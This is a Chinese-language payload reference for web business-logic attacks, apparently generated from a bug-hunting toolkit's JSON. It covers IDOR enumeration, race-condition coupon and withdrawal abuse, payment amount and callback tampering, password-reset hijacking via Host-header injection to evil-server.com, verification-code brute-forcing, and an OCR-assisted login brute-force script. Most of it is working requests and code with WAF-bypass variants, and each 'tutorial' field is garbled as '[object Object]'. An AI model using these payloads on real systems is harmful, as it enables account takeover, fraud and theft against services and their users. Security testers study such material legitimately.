# 业务逻辑漏洞 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（5 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. IDOR越权访问

- **id:** `biz-idor`
- **分类:** 业务逻辑漏洞 / 越权漏洞
- **tags:** `IDOR` `越权` `业务逻辑` `OWASP` `A01`

不安全的直接对象引用(IDOR)，通过篡改请求参数中的对象ID越权访问他人数据。攻击者可遍历用户ID、订单号等参数获取未授权资源。

**前置条件**

- 目标存在基于ID的资源访问接口
- 已登录普通用户账号

**利用步骤**

#### 1. 识别可遍历参数

```
# 抓取请求中的ID参数
GET /api/users/1001/profile HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 常见IDOR参数：user_id, order_id, file_id, invoice_id, account_id
```

识别API中使用数字/UUID作为资源标识符的端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `/api/users/1001/profile` | RESTful资源路径，1001为可篡改的用户ID | path |
| `Authorization: Bearer` | 携带当前用户的JWT令牌 | header |
| `{TARGET}` | 目标主机 | variable |
| `{TOKEN}` | 认证令牌 | variable |

#### 2. 水平越权测试

```
# 用A用户的Token访问B用户的数据
for id in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    -H "Authorization: Bearer {TOKEN}" \
    "https://{TARGET}/api/users/$id/profile"
  echo " -> user_id=$id"
done
```

遍历用户ID参数，观察响应码和大小差异以确认越权

| 片段 | 说明 | 类型 |
|---|---|---|
| `seq 1000 1010` | 生成连续ID序列用于遍历 | command |
| `%{http_code}` | curl输出HTTP状态码 | format |
| `%{size_download}` | 输出响应体大小用于对比 | format |
| `-s -o /dev/null` | 静默模式，丢弃响应体 | parameter |

#### 3. 垂直越权测试

```
# 用普通用户Token访问管理员接口
GET /api/admin/users HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 尝试修改角色
PUT /api/users/1001 HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"role": "admin", "is_admin": true}
```

尝试以低权限用户调用管理员API或修改自身角色

| 片段 | 说明 | 类型 |
|---|---|---|
| `GET /api/admin/users` | 管理员专属接口 | path |
| `PUT` | HTTP修改请求方法 | method |
| `"role": "admin"` | 尝试修改用户角色为管理员 | json |
| `"is_admin": true` | 尝试开启管理员标志位 | json |

#### 4. 参数污染越权

```
# 双参数污染
GET /api/orders?user_id=1001&user_id=1002 HTTP/1.1

# JSON参数覆盖
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 1001, "name": "test", "user_id": 1002}

# 数组注入
GET /api/orders?user_id[]=1001&user_id[]=1002 HTTP/1.1
```

利用参数重复、JSON键覆盖和数组注入绕过IDOR防御

| 片段 | 说明 | 类型 |
|---|---|---|
| `user_id=1001&user_id=1002` | HTTP参数污染(HPP)，同一参数出现两次 | technique |
| `"user_id": 1002` | JSON重复键覆盖前值 | json |
| `user_id[]` | 数组参数注入 | technique |

**WAF 绕过**

#### 编码ID绕过

```
# Base64编码ID
/api/users/MTAwMQ== (base64 of 1001)
# Hex编码
/api/users/0x3E9
# 负数/溢出
/api/users/-1
/api/users/2147483647
```

通过编码、负数、溢出等方式绕过ID校验

| 片段 | 说明 | 类型 |
|---|---|---|
| `MTAwMQ==` | 1001的Base64编码 | encoding |
| `0x3E9` | 1001的十六进制表示 | encoding |
| `-1` | 负数边界测试 | value |
| `2147483647` | INT32最大值溢出测试 | value |

**教程**

[object Object]

---

### 2. 竞态条件攻击

- **id:** `biz-race-condition`
- **分类:** 业务逻辑漏洞 / 竞态条件
- **tags:** `竞态条件` `Race Condition` `TOCTOU` `并发` `业务逻辑`

利用服务端TOCTOU(Time-of-Check to Time-of-Use)漏洞，通过并发请求在检查与执行之间的时间窗口内多次触发同一操作，实现重复领券、重复提现、超额购买等业务逻辑突破。

**前置条件**

- 目标存在余额/积分/优惠券等可量化资源操作
- Python/Turbo Intruder环境

**利用步骤**

#### 1. 识别竞态目标

```
# 典型竞态场景：
# 1. 优惠券领取 POST /api/coupon/claim
# 2. 余额提现 POST /api/withdraw
# 3. 积分兑换 POST /api/points/exchange
# 4. 限量商品抢购 POST /api/order/create
# 5. 投票/点赞 POST /api/vote
```

识别涉及资源扣减、限量操作的API端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `POST /api/coupon/claim` | 优惠券领取——典型竞态目标 | path |
| `POST /api/withdraw` | 提现操作——余额竞态 | path |
| `TOCTOU` | 检查时间到使用时间的竞态窗口 | concept |

#### 2. Python并发测试脚本

```
import asyncio
import aiohttp

async def race_request(session, url, headers, data):
    async with session.post(url, headers=headers, json=data) as resp:
        return await resp.json()

async def main():
    url = "https://{TARGET}/api/coupon/claim"
    headers = {"Authorization": "Bearer {TOKEN}"}
    data = {"coupon_id": "COUPON001"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, headers, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("code") == 200)
        print(f"Total: {len(results)}, Success: {success}")

asyncio.run(main())
```

使用Python asyncio并发发送50个相同请求，检测是否能多次领取

| 片段 | 说明 | 类型 |
|---|---|---|
| `asyncio.gather` | 并行等待所有协程完成 | function |
| `aiohttp.ClientSession` | 异步HTTP客户端 | function |
| `for _ in range(50)` | 创建50个并发请求 | keyword |
| `{TARGET}` | 目标地址 | variable |

#### 3. Burp Turbo Intruder测试

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=True)
    for i in range(50):
        engine.queue(target.req, gate="race1")
    engine.openGate("race1")

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)
```

Burp Turbo Intruder的gate机制确保所有请求同时发出

| 片段 | 说明 | 类型 |
|---|---|---|
| `concurrentConnections=30` | 30个并发连接 | parameter |
| `pipeline=True` | 启用HTTP管线化提高并发性 | parameter |
| `gate="race1"` | 请求闸门——所有请求排队后同时释放 | technique |
| `engine.openGate` | 打开闸门，同时发送所有排队请求 | function |

#### 4. 验证竞态成功

```
# 检查资源是否被多次消耗
GET /api/user/coupons HTTP/1.1
Host: {TARGET}
Authorization: Bearer {TOKEN}

# 预期：限领1张优惠券实际领到多张
# 检查余额变化
GET /api/user/balance HTTP/1.1
```

查询账户资源确认竞态条件是否成功利用

| 片段 | 说明 | 类型 |
|---|---|---|
| `GET /api/user/coupons` | 查询用户优惠券列表 | path |
| `GET /api/user/balance` | 查询用户余额 | path |

**WAF 绕过**

#### HTTP/2单连接并发

```
# HTTP/2 multiplexing同一连接并发
curl --http2 --parallel --parallel-max 50 \
  -H "Authorization: Bearer {TOKEN}" \
  -X POST "https://{TARGET}/api/coupon/claim" \
  -d '{"coupon_id":"C001"}' \
  --next --http2 --parallel ...
```

HTTP/2多路复用在单TCP连接中发送多个并发请求，绕过基于连接数的限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `--http2` | 强制使用HTTP/2协议 | parameter |
| `--parallel --parallel-max 50` | 并行请求最大50个 | parameter |
| `multiplexing` | HTTP/2多路复用特性 | concept |

**教程**

[object Object]

---

### 3. 支付逻辑篡改

- **id:** `biz-payment-tamper`
- **分类:** 业务逻辑漏洞 / 支付安全
- **tags:** `支付` `金额篡改` `业务逻辑` `0元购` `电商安全`

通过修改支付请求中的金额、数量、折扣等参数来操纵交易逻辑。常见于电商平台和在线支付系统中，可导致0元购、负价格、折扣叠加等严重业务风险。

**前置条件**

- 目标存在支付/下单功能
- 可拦截和修改HTTP请求

**利用步骤**

#### 1. 金额篡改测试

```
POST /api/order/create HTTP/1.1
Host: {TARGET}
Content-Type: application/json
Authorization: Bearer {TOKEN}

# 原始请求
{"product_id": "P001", "quantity": 1, "price": 9900}

# 篡改为1分钱
{"product_id": "P001", "quantity": 1, "price": 1}

# 篡改为0元
{"product_id": "P001", "quantity": 1, "price": 0}

# 负数金额（退款到账）
{"product_id": "P001", "quantity": 1, "price": -100}
```

修改订单请求中的价格字段，测试后端是否校验金额

| 片段 | 说明 | 类型 |
|---|---|---|
| `"price": 9900` | 原始金额9900分(99元) | json |
| `"price": 1` | 篡改为1分钱 | json |
| `"price": -100` | 负数金额可能导致余额增加 | json |

#### 2. 数量与运费篡改

```
# 数量为0或负数
{"product_id": "P001", "quantity": 0, "price": 9900}
{"product_id": "P001", "quantity": -1, "price": 9900}

# 修改运费
{"product_id": "P001", "quantity": 1, "shipping_fee": -500}

# 超大折扣
{"product_id": "P001", "quantity": 1, "discount": 9999}
```

测试数量边界值、运费篡改和折扣溢出

| 片段 | 说明 | 类型 |
|---|---|---|
| `"quantity": -1` | 负数量可能导致退款 | json |
| `"shipping_fee": -500` | 负运费抵扣总价 | json |
| `"discount": 9999` | 超额折扣使总价为负 | json |

#### 3. 优惠券叠加与替换

```
# 叠加使用多张优惠券
{"product_id": "P001", "coupons": ["C001", "C002", "C003"]}

# 替换高额优惠券ID
{"product_id": "P001", "coupon_id": "INTERNAL_VIP_100OFF"}

# 修改优惠金额字段
{"product_id": "P001", "coupon_discount": 9900}
```

测试优惠券是否可叠加使用或替换为高面额券

| 片段 | 说明 | 类型 |
|---|---|---|
| `"coupons": [...]` | 数组传递多张优惠券尝试叠加 | json |
| `"coupon_discount": 9900` | 直接篡改优惠金额 | json |

#### 4. 支付回调篡改

```
# 模拟支付成功回调
POST /api/payment/callback HTTP/1.1
Host: {TARGET}
Content-Type: application/x-www-form-urlencoded

order_id=ORD20240001&status=SUCCESS&amount=1&sign=tampered_sign

# 修改回调中的金额
order_id=ORD20240001&status=SUCCESS&amount=1&trade_no=FAKE123456
```

伪造支付平台回调通知，篡改支付状态和金额

| 片段 | 说明 | 类型 |
|---|---|---|
| `status=SUCCESS` | 伪造支付成功状态 | value |
| `amount=1` | 实际支付1分但订单金额为99元 | value |
| `sign=tampered_sign` | 尝试伪造签名（如签名校验缺失） | value |

**WAF 绕过**

#### 科学计数法绕过

```
# 科学计数法
{"price": 1e-10}
# 浮点精度
{"price": 0.000000001}
# 字符串类型混淆
{"price": "0.01"}
# Unicode数字
{"price": "\uff10"}
```

利用科学计数法、浮点精度、类型混淆绕过金额校验

| 片段 | 说明 | 类型 |
|---|---|---|
| `1e-10` | 科学计数法表示极小金额 | encoding |
| `0.000000001` | 浮点精度下溢 | value |
| `"0.01"` | 字符串类型可能绕过数值校验 | technique |

**教程**

[object Object]

---

### 4. 密码重置逻辑缺陷

- **id:** `biz-password-reset`
- **分类:** 业务逻辑漏洞 / 认证缺陷
- **tags:** `密码重置` `认证绕过` `业务逻辑` `验证码` `Host注入`

密码重置流程中的逻辑漏洞，包括重置令牌泄露、验证码爆破、响应操纵、Host头注入等攻击手法，可实现任意用户密码重置。

**前置条件**

- 目标存在密码重置/找回功能
- 可拦截HTTP请求

**利用步骤**

#### 1. Host头注入窃取重置链接

```
POST /api/password/reset HTTP/1.1
Host: evil-server.com
X-Forwarded-Host: evil-server.com
Content-Type: application/json

{"email": "victim@target.com"}

# 受害者收到的重置链接变为：
# https://evil-server.com/reset?token=abc123
```

修改Host头使重置邮件中的链接指向攻击者服务器，窃取重置token

| 片段 | 说明 | 类型 |
|---|---|---|
| `Host: evil-server.com` | 篡改Host头使重置链接指向攻击者 | header |
| `X-Forwarded-Host` | 备选注入头，反代可能信任此头 | header |
| `victim@target.com` | 目标用户的邮箱 | value |

#### 2. 验证码爆破

```
# 4位验证码爆破
for code in $(seq -w 0000 9999); do
  response=$(curl -s -X POST "https://{TARGET}/api/verify-code" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}")
  if echo "$response" | grep -q "success"; then
    echo "[+] Code found: $code"
    break
  fi
done
```

暴力破解4-6位验证码，测试是否有频率限制

| 片段 | 说明 | 类型 |
|---|---|---|
| `seq -w 0000 9999` | 生成0000-9999所有4位数 | command |
| `grep -q "success"` | 匹配成功响应 | command |
| `{TARGET}` | 目标地址 | variable |

#### 3. 响应操纵绕过

```
# 原始失败响应
{"code": 400, "message": "验证码错误"}

# 拦截并修改为成功
{"code": 200, "message": "验证成功", "token": "reset_token_here"}

# 某些前端仅检查code字段就放行后续操作
```

拦截并修改服务端响应，前端可能仅依赖响应状态判断

| 片段 | 说明 | 类型 |
|---|---|---|
| `"code": 200` | 将错误码修改为成功码 | json |
| `响应操纵` | 修改HTTP响应欺骗前端 | concept |

#### 4. 重置令牌弱随机性

```
# 收集多个重置令牌分析规律
token1: 1707811200_user1  (时间戳+用户名)
token2: 1707811260_user2

# 可预测的token生成
import hashlib
token = hashlib.md5(f"{timestamp}_{email}".encode()).hexdigest()

# 使用已知信息构造重置token
predicted = hashlib.md5(b"1707811200_victim@target.com").hexdigest()
```

分析重置令牌的生成算法，检查是否基于可预测因素

| 片段 | 说明 | 类型 |
|---|---|---|
| `hashlib.md5` | MD5哈希——弱随机性token常用 | function |
| `timestamp_email` | 时间戳+邮箱——可预测的token因子 | concept |

**WAF 绕过**

#### 多Host头绕过

```
# 双Host头
Host: target.com
Host: evil.com

# 绝对URL覆盖
POST https://evil.com/api/password/reset HTTP/1.1
Host: target.com

# X-Forwarded系列
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Original-URL: https://evil.com/reset
```

使用多种HTTP头注入方式尝试覆盖重置链接中的域名

| 片段 | 说明 | 类型 |
|---|---|---|
| `双Host头` | 部分服务器取第二个Host值 | technique |
| `X-Forwarded-Host` | 反向代理信任的转发头 | header |

**教程**

[object Object]

---

### 5. 验证码绕过技术

- **id:** `biz-captcha-bypass`
- **分类:** 业务逻辑漏洞 / 验证码安全
- **tags:** `验证码` `CAPTCHA` `绕过` `短信验证码` `人机验证`

绕过图形验证码、短信验证码、滑动验证等人机验证机制的各种技术手法，包括响应泄露、复用攻击、OCR识别、逻辑缺陷利用等。

**前置条件**

- 目标存在验证码保护的功能
- Python环境

**利用步骤**

#### 1. 验证码响应泄露

```
# 检查响应中是否包含验证码
POST /api/send-sms HTTP/1.1
Host: {TARGET}
Content-Type: application/json

{"phone": "13800138000"}

# 响应可能泄露
{"code": 200, "captcha": "8462", "message": "发送成功"}
# 或在响应头中
X-Captcha-Code: 8462
Set-Cookie: captcha=ODQ2Mg==  (base64 of 8462)
```

检查响应body、header、cookie中是否泄露验证码明文或编码值

| 片段 | 说明 | 类型 |
|---|---|---|
| `"captcha": "8462"` | 响应body直接泄露验证码 | json |
| `X-Captcha-Code` | 自定义响应头泄露验证码 | header |
| `ODQ2Mg==` | 8462的Base64编码在Cookie中 | encoding |

#### 2. 验证码复用攻击

```
# 步骤1: 正常获取并输入正确验证码
POST /api/login
{"username": "test", "password": "test123", "captcha": "8462", "captcha_id": "abc"}

# 步骤2: 使用相同captcha_id和验证码反复尝试
POST /api/login
{"username": "admin", "password": "admin123", "captcha": "8462", "captcha_id": "abc"}

# 如果验证码未在使用后失效，可以一直复用
```

验证码使用后未失效，同一验证码可反复使用

| 片段 | 说明 | 类型 |
|---|---|---|
| `"captcha_id": "abc"` | 验证码会话ID | json |
| `复用攻击` | 同一验证码+ID组合反复使用 | concept |

#### 3. 删除验证码参数

```
# 原始请求（包含验证码）
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass", "captcha": "1234"}

# 删除验证码字段
POST /api/login HTTP/1.1
{"username": "admin", "password": "pass"}

# 空值测试
{"username": "admin", "password": "pass", "captcha": ""}
{"username": "admin", "password": "pass", "captcha": null}
```

测试不传、空传、null传验证码参数时后端是否仍然校验

| 片段 | 说明 | 类型 |
|---|---|---|
| `删除captcha字段` | 服务端可能跳过未传参数的校验 | technique |
| `"captcha": null` | null值可能绕过非空校验 | value |

#### 4. 万能验证码

```
# 常见万能/调试验证码
0000
1111
1234
8888
9999
6666
000000
123456

# 测试接口调试后门
{"phone": "13800138000", "code": "000000", "debug": true}
{"phone": "13800138000", "code": "master_code"}
```

测试开发者遗留的万能验证码或调试后门

| 片段 | 说明 | 类型 |
|---|---|---|
| `0000/1234/8888` | 常见开发调试万能码 | value |
| `"debug": true` | 调试模式参数可能绕过验证 | json |

**WAF 绕过**

#### OCR自动识别图形验证码

```
import ddddocr
import requests

ocr = ddddocr.DdddOcr()

def solve_captcha(target):
    # 获取验证码图片
    resp = requests.get(f"https://{target}/captcha/image")
    code = ocr.classification(resp.content)
    return code

# 集成到爆破脚本中
for pwd in passwords:
    captcha = solve_captcha("{TARGET}")
    r = requests.post(f"https://{TARGET}/api/login",
        json={"user":"admin","pass":pwd,"captcha":captcha})
    if "success" in r.text:
        print(f"[+] Password: {pwd}")
```

使用ddddocr库自动识别图形验证码集成到爆破流程

| 片段 | 说明 | 类型 |
|---|---|---|
| `ddddocr.DdddOcr` | 国产深度学习OCR库，识别率高 | function |
| `ocr.classification` | 图片分类识别验证码文字 | function |

**教程**

[object Object]
